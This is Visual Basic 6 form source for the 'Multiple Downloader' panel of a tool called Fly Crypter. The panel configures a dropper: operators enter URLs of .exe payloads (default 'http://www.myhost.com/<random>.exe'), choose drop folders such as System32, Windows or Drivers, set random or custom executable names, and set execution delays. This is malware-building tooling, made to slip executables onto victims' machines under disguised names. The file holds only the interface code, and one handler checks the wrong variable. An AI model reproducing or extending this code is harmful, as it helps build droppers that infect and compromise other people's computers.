VERSION 5.00
Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "MSCOMCTL.OCX"
Begin VB.Form downloader 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Fly Crypter -Multiple Downloader"
   ClientHeight    =   1350
   ClientLeft      =   6180
   ClientTop       =   5775
   ClientWidth     =   6015
   LinkTopic       =   "Form2"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   1350
   ScaleWidth      =   6015
   Begin MSComctlLib.ImageList imglist 
      Left            =   0
      Top             =   0
      _ExtentX        =   1005
      _ExtentY        =   1005
      BackColor       =   -2147483643
      MaskColor       =   12632256
      _Version        =   393216
   End
   Begin VB.PictureBox p 
      Height          =   255
      Left            =   600
      ScaleHeight     =   195
      ScaleWidth      =   195
      TabIndex        =   1
      Top             =   120
      Visible         =   0   'False
      Width           =   255
   End
   Begin MSComctlLib.ListView Lv 
      Height          =   1335
      Left            =   0
      TabIndex        =   0
      Top             =   0
      Width           =   6015
      _ExtentX        =   10610
      _ExtentY        =   2355
      View            =   3
      LabelEdit       =   1
      LabelWrap       =   -1  'True
      HideSelection   =   -1  'True
      OLEDragMode     =   1
      OLEDropMode     =   1
      FullRowSelect   =   -1  'True
      GridLines       =   -1  'True
      _Version        =   393217
      Icons           =   "il"
      SmallIcons      =   "il"
      ForeColor       =   -2147483640
      BackColor       =   -2147483643
      BorderStyle     =   1
      Appearance      =   1
      OLEDragMode     =   1
      OLEDropMode     =   1
      NumItems        =   4
      BeginProperty ColumnHeader(1) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         Text            =   "Url"
         Object.Width           =   4410
      EndProperty
      BeginProperty ColumnHeader(2) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   1
         Text            =   "Drop to"
         Object.Width           =   2117
      EndProperty
      BeginProperty ColumnHeader(3) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   2
         Text            =   "Drop as"
         Object.Width           =   2117
      EndProperty
      BeginProperty ColumnHeader(4) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   3
         Text            =   "Delay"
         Object.Width           =   1764
      EndProperty
   End
   Begin VB.Menu Menu 
      Caption         =   "Menu"
      Visible         =   0   'False
      Begin VB.Menu url 
         Caption         =   "Url"
         Begin VB.Menu aur 
            Caption         =   "Add a url"
         End
         Begin VB.Menu rurl 
            Caption         =   "Remove url"
         End
         Begin VB.Menu edit 
            Caption         =   "Edit url"
         End
         Begin VB.Menu clear 
            Caption         =   "Clear list"
         End
      End
      Begin VB.Menu sep1 
         Caption         =   "-"
      End
      Begin VB.Menu drpto 
         Caption         =   "Drop to"
         Begin VB.Menu drptmp 
            Caption         =   "Temporary"
         End
         Begin VB.Menu sys32 
            Caption         =   "System32"
         End
         Begin VB.Menu wind 
            Caption         =   "Windows"
         End
         Begin VB.Menu sys 
            Caption         =   "System"
         End
         Begin VB.Menu driv 
            Caption         =   "Drivers"
         End
      End
      Begin VB.Menu dropas 
         Caption         =   "Drop as"
         Begin VB.Menu cname 
            Caption         =   "Custom name"
         End
         Begin VB.Menu rnm 
            Caption         =   "Random name"
         End
      End
      Begin VB.Menu del 
         Caption         =   "Delay"
         Begin VB.Menu cdel 
            Caption         =   "Custom Delay"
         End
         Begin VB.Menu deln 
            Caption         =   "None"
         End
      End
      Begin VB.Menu sep2 
         Caption         =   "-"
      End
      Begin VB.Menu cancel 
         Caption         =   "Cancel"
      End
      Begin VB.Menu ok 
         Caption         =   "Save"
      End
   End
End
Attribute VB_Name = "downloader"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub cdel_Click()
  Dim sInput       As String
  If dat = False Then
  If Lv.SelectedItem.SubItems(3) = "0" Then
  sInput = InputBox("1000 milliseconds = 1 second" & vbNewLine & vbNewLine & "60000 milliseconds = 1 minut" & vbNewLine & vbNewLine & "360000 milliseconds = 1 hour", "Delay in Milliseconds", vbNullString)
  Else
  sInput = InputBox("1000 milliseconds = 1 second" & vbNewLine & vbNewLine & "60000 milliseconds = 1 minut" & vbNewLine & vbNewLine & "360000 milliseconds = 1 hour", "Delay in Milliseconds", Lv.SelectedItem.SubItems(3))
  End If
  If sInput = "" Then Exit Sub
  Lv.SelectedItem.SubItems(3) = sInput
  deln.Checked = 0
  End If
End Sub
Private Sub deln_Click()
  Lv.SelectedItem.SubItems(3) = "0"
End Sub
Private Sub driv_Click()
  If dat = False Then
  If driv.Checked = False Then
  Lv.SelectedItem.SubItems(1) = "Drivers"
  driv.Checked = True
  sys.Checked = False
  drptmp.Checked = False
  sys32.Checked = False
  wind.Checked = False
  Else
  driv.Checked = False
  Lv.SelectedItem.SubItems(1) = "-"
  End If
  End If
End Sub
Private Sub edit_Click()
  Dim sdd       As String
  If dat = False Then
  sdd = InputBox("Enter your url here", "Add a url", Lv.SelectedItem.Text)
  If sdd = "" Then
  Exit Sub
  Else
  If Left(sdef, 7) <> "http://" Then
  sdd = "http://" & sdd
  End If
  Lv.SelectedItem.Text = sdd
  End If
  End If
End Sub
Private Sub rnm_Click()
  Lv.SelectedItem.SubItems(2) = lRan(5) & ".exe"
End Sub
Private Sub aur_Click()
  Dim sdef       As String
  Dim z          As Integer
  Open tmp & "\tmp.html" For Binary As #12
  Put #12, , "Fly Crypter v2d Here"
  Close #12
  sdef = InputBox("Enter your url here", "Add a url", "http://www.myhost.com/" & lRan(5) & ".exe")
  If sdef = "" Then Exit Sub

  If Left(sdef, 7) <> "http://" Then
  sdef = "http://" & sdef
  End If
  
  For z = 1 To Lv.ListItems.Count
  If Lv.ListItems.Item(z).Text = sdef Then Exit Sub
  Next z
  
  Open tmp & "\tmp.html" For Output As #20
  Print #20, , "Fly Crypter Here!"
  Close #20
  
  With Lv.ListItems.Add(, , sdef, , licc(tmp & "\tmp.html"))
  .SubItems(1) = "Temporary"
  
  If Right(sdef, 4) <> ".exe" Then
  .SubItems(2) = lRan(5) & Right(sdef, 4)
  Else
  .SubItems(2) = lRan(5) & ".exe"
  End If
  
  .SubItems(3) = "0"
  End With
End Sub
Private Sub cancel_Click()
  Lv.ListItems.clear
  Form1.downl.Checked = False
  Unload Me
End Sub
Private Sub clear_Click()
  Lv.ListItems.clear
End Sub
Private Sub cname_Click()
  If dat = False Then
  Dim cnm       As String
  cnm = InputBox("Enter your custom name here", "Custom drop name", Lv.SelectedItem.SubItems(2))
  If cnm = "" Then
  Lv.SelectedItem.SubItems(2) = lRan(5) & ".exe"
  Exit Sub
  Else
  If Not Right(cnm, 4) = ".exe" Then cnm = cnm & ".exe"
  Lv.SelectedItem.SubItems(2) = cnm
  End If
  End If
End Sub
Private Sub drptmp_Click()
  If dat = False Then
  If drptmp.Checked = False Then
  Lv.SelectedItem.SubItems(1) = "Temporary"
  drptmp.Checked = True
  sys32.Checked = False
  wind.Checked = False
  sys.Checked = False
  driv.Checked = False
  Else
  drptmp.Checked = False
  Lv.SelectedItem.SubItems(1) = "-"
  End If
  End If
End Sub
Private Sub Form_Unload(cancel As Integer)
  Lv.ListItems.clear
  Form1.downl.Checked = 0
  Unload Me
End Sub
Private Sub Lv_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
  If Lv.ListItems.Count > 0 Then
  rurl.Enabled = True
  clear.Enabled = True
  drpto.Enabled = True
  dropas.Enabled = True
  ok.Enabled = True
  del.Enabled = True
  driv.Checked = False
  Else
  del.Enabled = False
  rurl.Enabled = False
  clear.Enabled = False
  drpto.Enabled = False
  dropas.Enabled = False
  ok.Enabled = False
  End If
  If Button = 2 Then
  If dat = False Then
  drptmp.Checked = False
  sys32.Checked = False
  wind.Checked = False
  deln.Checked = 0
  sys.Checked = False
  rurl.Enabled = True
  drpto.Enabled = True
  dropas.Enabled = True
  edit.Enabled = True
  If Lv.SelectedItem.SubItems(1) = "-" Then
  drpto.Enabled = True
  dropas.Enabled = True
  del.Enabled = True
  PopupMenu Menu
  Exit Sub
  End If
  If Lv.SelectedItem.SubItems(1) = "Temporary" Then drptmp.Checked = True
  If Lv.SelectedItem.SubItems(1) = "System32" Then sys32.Checked = True
  If Lv.SelectedItem.SubItems(1) = "Windows" Then wind.Checked = True
  If Lv.SelectedItem.SubItems(1) = "System" Then sys.Checked = True
  If Lv.SelectedItem.SubItems(1) = "Drivers" Then driv.Checked = True
  If Lv.SelectedItem.SubItems(3) = "0" Then deln.Checked = 1
  PopupMenu Menu
  Else
  del.Enabled = False
  edit.Enabled = False
  drpto.Enabled = False
  dropas.Enabled = False
  rurl.Enabled = False
  PopupMenu Menu
  End If
  End If
End Sub
Private Function dat() As Boolean
  On Error Resume Next
  If Lv.SelectedItem.Selected = False Then
  dat = True
  Else
  dat = False
  End If
End Function
Private Sub ok_Click()
  Me.Hide
End Sub
Private Sub rurl_Click()
  If dat = False Then
  Lv.ListItems.Remove (Lv.SelectedItem.Index)
  End If
End Sub
Private Sub sys_Click()
  If dat = False Then
  If sys.Checked = False Then
  Lv.SelectedItem.SubItems(1) = "System"
  sys.Checked = True
  drptmp.Checked = False
  sys32.Checked = False
  wind.Checked = False
  driv.Checked = False
  Else
  sys.Checked = False
  Lv.SelectedItem.SubItems(1) = "-"
  End If
  End If
End Sub
Private Sub sys32_Click()
  If dat = False Then
  If sys32.Checked = False Then
  Lv.SelectedItem.SubItems(1) = "System32"
  sys32.Checked = True
  drptmp.Checked = False
  wind.Checked = False
  sys.Checked = False
  driv.Checked = False
  Else
  sys32.Checked = False
  Lv.SelectedItem.SubItems(1) = "-"
  End If
  End If
End Sub
Private Sub wind_Click()
  If dat = False Then
  If wind.Checked = False Then
  Lv.SelectedItem.SubItems(1) = "Windows"
  wind.Checked = True
  drptmp.Checked = False
  sys32.Checked = False
  sys.Checked = False
  driv.Checked = False
  Else
  wind.Checked = False
  Lv.SelectedItem.SubItems(1) = "-"
  End If
  End If
End Sub
